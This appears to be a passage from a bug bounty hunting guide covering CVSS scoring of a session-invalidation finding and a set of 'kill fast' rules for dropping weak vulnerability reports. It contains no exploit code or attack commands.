| Session not invalidated (with chain) | 5.4 | Medium | AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N |

Always recompute the CVSS vector by hand. Never trust a self-reported score — triager recomputes in 10 seconds and a mismatch destroys credibility on the whole report.

---

### Step 8.6 — Kill Fast Rules

1. **5-minute template rule**: Can't fill Q1 template in 5 minutes → move on
2. **Precondition count**: More than 2 simultaneous attacker preconditions → kill it
3. **Impact test**: "What does attacker walk away with?" — if nothing tangible → kill it
4. **Admin precondition**: "Admin can do X" → kill immediately
5. **Design doc test**: Documented behavior → kill immediately
6. **30-min PoC rule**: 30+ min on Q6 with no reproducible HTTP PoC → kill it

> *Only submit what a triager can reproduce in 60 seconds with your curl command.*
